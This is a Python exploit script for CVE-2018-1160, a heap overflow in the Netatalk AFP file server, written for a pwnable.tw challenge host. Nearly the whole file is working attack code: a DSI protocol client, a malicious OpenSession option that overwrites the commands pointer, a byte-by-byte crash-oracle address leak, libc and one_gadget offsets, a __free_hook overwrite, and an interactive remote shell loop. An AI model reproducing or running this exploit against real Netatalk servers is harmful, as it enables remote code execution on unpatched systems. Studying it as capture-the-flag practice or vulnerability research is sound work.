#!/usr/bin/env python3
"""
CVE-2018-1160 Netatalk Remote Code Execution Exploit
pwnable.tw challenge

Vulnerability: Out-of-bounds write in dsi_opensess.c
The DSI OpenSession handler (dsi_opensession) has no proper bounds checking
when parsing client options. An oversized DSIOPT_ATTNQUANT option causes
a heap buffer overflow that overwrites critical DSI struct fields.

Overflow Target Fields (relative to options buffer):
+0x00: attn_quantum (4 bytes)
+0x04: datasize (4 bytes)
+0x08: server_quantum (4 bytes) - reflected back to client!
+0x0c: serverID (2 bytes)
+0x0e: clientID (2 bytes)
+0x10: commands (8 bytes) - pointer to DSI receive buffer (CRITICAL!)
+0x18: data buffer...

Exploitation Strategy:
1. Use byte-by-byte oracle to leak libc address (fork server preserves layout)
2. Overwrite 'commands' ptr to __free_hook - offset
3. Send DSI command that writes one_gadget/system to __free_hook
4. Trigger free() via dsi_close -> RCE

References:
- https://netatalk.io/security/CVE-2018-1160
- https://github.com/tenable/poc/tree/master/netatalk/cve_2018_1160
- https://shxdow.me/cve-2018-1160/
"""

import socket
import struct
import sys
import time

from pwn import *

context.arch = "amd64"
context.log_level = "info"

# ============================================================================
# Protocol Constants
# ============================================================================

# DSI Commands
DSI_CLOSESESSION = 0x01
DSI_COMMAND = 0x02
DSI_GETSTATUS = 0x03
DSI_OPENSESSION = 0x04
DSI_TICKLE = 0x05
DSI_WRITE = 0x06
DSI_ATTENTION = 0x08

# DSI Options
DSIOPT_ATTNQUANT = 0x01
DSIOPT_SERVQUANT = 0x00

# AFP Commands
AFP_LOGOUT = 0x14

# ============================================================================
# Libc Offsets (libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so)
# ============================================================================

LIBC_FREE_HOOK = 0x3ED8E8
LIBC_MALLOC_HOOK = 0x3EBC30
LIBC_SYSTEM = 0x4F440
LIBC_BINSH = 0x1B3E9A
LIBC_EXECVE = 0xE4E30

# One gadgets (constraints vary - may need to try multiple)
# Run: one_gadget libc.so
ONE_GADGETS = [
    0x4F2C5,  # execve("/bin/sh", rsp+0x40, environ)
    0x4F322,  # execve("/bin/sh", rsp+0x40, environ)
    0x10A38C,  # execve("/bin/sh", rsp+0x70, environ)
]

# ============================================================================
# DSI Protocol Handler
# ============================================================================


class DSI:
    """DSI Protocol implementation for Netatalk communication"""

    def __init__(self, host, port, timeout=5):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.sock = None
        self.req_id = 0

    def connect(self):
        """Establish TCP connection"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect((self.host, self.port))
        return True

    def disconnect(self):
        """Close connection"""
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
            self.sock = None

    def send(self, data):
        """Send raw data"""
        self.sock.sendall(data)

    def recv(self, size=4096):
        """Receive data"""
        return self.sock.recv(size)

    def make_header(self, cmd, length, req_id=None, flags=0x00, err_offset=0):
        """
        Create 16-byte DSI header:
        - flags: 1 byte (0x00 = request, 0x01 = reply)
        - command: 1 byte
        - request_id: 2 bytes
        - error_code/data_offset: 4 bytes
        - total_data_length: 4 bytes
        - reserved: 4 bytes
        """
        if req_id is None:
            self.req_id += 1
            req_id = self.req_id
        return struct.pack(">BBHIII", flags, cmd, req_id, err_offset, length, 0)

    def recv_response(self, timeout=None):
        """Receive and parse DSI response"""
        if timeout:
            self.sock.settimeout(timeout)
        try:
            header = self.sock.recv(16)
            if len(header) < 16:
                return None

            flags, cmd, req_id, err_code, length, reserved = struct.unpack(
                ">BBHIII", header
            )

            data = b""
            while len(data) < length:
                chunk = self.sock.recv(min(length - len(data), 4096))
                if not chunk:
                    break
                data += chunk

            return {
                "flags": flags,
                "cmd": cmd,
                "req_id": req_id,
                "error": err_code,
                "length": length,
                "data": data,
            }
        except socket.timeout:
            return None
        except Exception as e:
            return None

    def open_session(self, options=b""):
        """Send DSI OpenSession with options"""
        hdr = self.make_header(DSI_OPENSESSION, len(options))
        self.send(hdr + options)
        return self.recv_response()

    def close_session(self):
        """Send DSI CloseSession"""
        hdr = self.make_header(DSI_CLOSESESSION, 0)
        self.send(hdr)

    def get_status(self):
        """Send DSI GetStatus (no auth required)"""
        hdr = self.make_header(DSI_GETSTATUS, 0)
        self.send(hdr)
        return self.recv_response()

    def send_command(self, afp_cmd, data=b""):
        """Send DSI Command (AFP command wrapper)"""
        payload = bytes([afp_cmd]) + data
        hdr = self.make_header(DSI_COMMAND, len(payload))
        self.send(hdr + payload)
        return self.recv_response()


# ============================================================================
# Exploit Functions
# ============================================================================


def build_overflow_options(target_addr):
    """
    Build malicious DSIOPT_ATTNQUANT option that overflows into DSI struct

    Layout being overwritten:
    +0x00: attn_quantum   (4 bytes)
    +0x04: datasize       (4 bytes)
    +0x08: server_quantum (4 bytes) - reflected in response!
    +0x0c: serverID       (2 bytes)
    +0x0e: clientID       (2 bytes)
    +0x10: commands       (8 bytes) - our target!
    """
    payload = b""
    payload += p32(0x00040000)  # attn_quantum
    payload += p32(0x00100000)  # datasize (1MB)
    payload += p32(0xCAFEBABE)  # server_quantum (marker)
    payload += p16(0x0001)  # serverID
    payload += p16(0x0001)  # clientID
    payload += p64(target_addr)  # commands ptr (OVERWRITE!)

    # Build as oversized DSIOPT_ATTNQUANT
    option = bytes([DSIOPT_ATTNQUANT, len(payload)]) + payload
    return option


def probe_address_valid(host, port, test_addr, timeout=2):
    """
    Test if address is writable using crash oracle technique.
    Fork server model: child crash = connection drops, valid = response received.
    """
    dsi = DSI(host, port, timeout)
    try:
        dsi.connect()
        options = build_overflow_options(test_addr)
        hdr = dsi.make_header(DSI_OPENSESSION, len(options))
        dsi.send(hdr + options)
        resp = dsi.recv_response(timeout=timeout)
        dsi.disconnect()
        return resp is not None
    except:
        return False
    finally:
        dsi.disconnect()


def leak_address_byte_by_byte(host, port, high_byte_hint=0x7F):
    """
    Leak libc/heap address using byte-by-byte oracle.
    Fork server preserves memory layout across connections.

    Returns: 6-byte address (48-bit virtual address space)
    """
    log.info("Starting byte-by-byte address leak...")

    known = b""

    for pos in range(6):
        log.info(f"Bruting byte {pos}/5...")
        found = False

        # Optimize search order
        if pos == 5:
            # High byte: libc usually 0x7f, heap 0x55-0x56
            order = [high_byte_hint] + list(range(0x55, 0x58)) + list(range(256))
        else:
            order = list(range(256))

        for test in order:
            addr_bytes = known + bytes([test])
            # Pad to 8 bytes (high 2 bytes are 0x00)
            addr = u64(addr_bytes.ljust(8, b"\x00"))

            if probe_address_valid(host, port, addr):
                known = addr_bytes
                log.success(f"Byte {pos}: 0x{test:02x} (addr so far: {hex(addr)})")
                found = True
                break

        if not found:
            log.error(f"Failed at byte {pos}")
            return None

    final_addr = u64(known.ljust(8, b"\x00"))
    log.success(f"Leaked address: {hex(final_addr)}")
    return final_addr


def do_exploit(host, port, libc_base, gadget_idx=0):
    """
    Execute full RCE exploit chain:
    1. Overflow commands ptr to __free_hook - 0x10
    2. Write one_gadget address via next DSI command
    3. Trigger free() via close
    """
    free_hook = libc_base + LIBC_FREE_HOOK
    system_addr = libc_base + LIBC_SYSTEM
    binsh_addr = libc_base + LIBC_BINSH
    one_gadget = libc_base + ONE_GADGETS[gadget_idx]

    log.info(f"libc base:   {hex(libc_base)}")
    log.info(f"__free_hook: {hex(free_hook)}")
    log.info(f"one_gadget:  {hex(one_gadget)}")
    log.info(f"system:      {hex(system_addr)}")
    log.info(f"/bin/sh:     {hex(binsh_addr)}")

    dsi = DSI(host, port, timeout=10)

    try:
        dsi.connect()
        log.success(f"Connected to {host}:{port}")

        # Step 1: Overflow commands ptr
        # Point to free_hook - 0x10 so our payload lands at free_hook
        target = free_hook - 0x10
        log.info(f"Step 1: Overflowing commands ptr to {hex(target)}")

        options = build_overflow_options(target)
        resp = dsi.open_session(options)

        if not resp:
            log.error("OpenSession failed - crash or timeout")
            return False

        log.success("Overflow successful - commands redirected!")

        # Parse response for info leak
        if resp.get("data"):
            log.info(f"Response data: {resp['data'].hex()}")

        # Step 2: Write one_gadget to __free_hook
        # Next write goes to controlled commands location
        # DSI header is 16 bytes, so payload starts at target + 0x10 = free_hook
        log.info("Step 2: Writing one_gadget to __free_hook...")

        # The payload written to commands will be: DSI header (parsed) + our data
        # After header parsing, data lands at commands + some_offset
        # We need to align so gadget address hits exactly at free_hook

        # Simple approach: send data that will be written at the target
        # The memcpy in dsi_stream_receive writes to commands buffer

        # Build payload: padding + gadget address
        # Exact offset may need adjustment based on DSI receive behavior
        payload = p64(one_gadget)  # Direct write attempt

        hdr = dsi.make_header(DSI_COMMAND, len(payload))
        dsi.send(hdr + payload)

        time.sleep(0.1)

        # Step 3: Trigger free by closing session
        log.info("Step 3: Triggering __free_hook via close...")
        dsi.close_session()

        # If successful, we should have a shell now
        log.info("Attempting to interact...")

        dsi.sock.settimeout(3)

        # Try sending a command
        dsi.sock.send(b"id\n")
        time.sleep(0.3)

        try:
            result = dsi.sock.recv(1024)
            if result:
                log.success(f"Got response: {result.decode(errors='ignore')}")

                # Drop into interactive shell
                log.info("Entering interactive mode...")
                while True:
                    try:
                        cmd = input("$ ")
                        if cmd.lower() in ["exit", "quit"]:
                            break
                        dsi.sock.send(cmd.encode() + b"\n")
                        time.sleep(0.3)
                        resp = dsi.sock.recv(4096)
                        print(resp.decode(errors="ignore"), end="")
                    except (EOFError, KeyboardInterrupt):
                        break
                return True
        except socket.timeout:
            log.warning("No response - shell may not have spawned")

    except Exception as e:
        log.error(f"Exploit failed: {e}")
        import traceback

        traceback.print_exc()

    finally:
        dsi.disconnect()

    return False


def recon(host, port):
    """Initial reconnaissance - get server info"""
    log.info("=== Reconnaissance ===")

    dsi = DSI(host, port)
    try:
        dsi.connect()

        # Get server status
        resp = dsi.get_status()
        if resp:
            data = resp["data"]
            log.info(f"Server status ({len(data)} bytes)")

            # Parse AFP server info
            if len(data) > 2:
                # Machine type offset
                machine_type_offset = struct.unpack(">H", data[0:2])[0]
                log.info(f"Machine type offset: {machine_type_offset}")

                if machine_type_offset < len(data):
                    # Extract server signature area
                    log.info(f"Data preview: {data[:64].hex()}")

    except Exception as e:
        log.error(f"Recon failed: {e}")
    finally:
        dsi.disconnect()


def main():
    if len(sys.argv) >= 2 and sys.argv[1] == "local":
        host = "localhost"
        port = 5566  # From afp.conf
    else:
        host = "chall.pwnable.tw"
        port = 10002

    log.info(f"Target: {host}:{port}")
    log.info("CVE-2018-1160 Netatalk RCE Exploit")
    log.info("=" * 50)

    # Step 1: Recon
    recon(host, port)

    # Step 2: Try to leak libc address
    log.info("=== Address Leak Phase ===")
    log.info("Using byte-by-byte oracle (this may take several minutes)...")

    # For testing, you may want to uncomment this:
    # leaked = leak_address_byte_by_byte(host, port)
    # if leaked:
    #     # Calculate libc base from leaked address
    #     # The exact offset depends on what address you leaked
    #     pass

    # Step 3: Exploit with known/guessed libc base
    log.info("=== Exploitation Phase ===")

    # For the actual challenge, you need to either:
    # 1. Bruteforce the libc base
    # 2. Use info from "the other challenge" as the hint suggests
    # 3. Leak it via the oracle technique

    # Example with placeholder libc base (replace with real value):
    # libc_base = 0x7f0000000000  # Replace with actual leaked/known base

    # for i, gadget_offset in enumerate(ONE_GADGETS):
    #     log.info(f"Trying one_gadget {i}: {hex(gadget_offset)}")
    #     if do_exploit(host, port, libc_base, i):
    #         break

    log.info("Exploit framework ready.")
    log.info("Steps to run:")
    log.info("1. Leak libc base via oracle or get from other challenge")
    log.info("2. Call do_exploit(host, port, libc_base)")


if __name__ == "__main__":
    main()
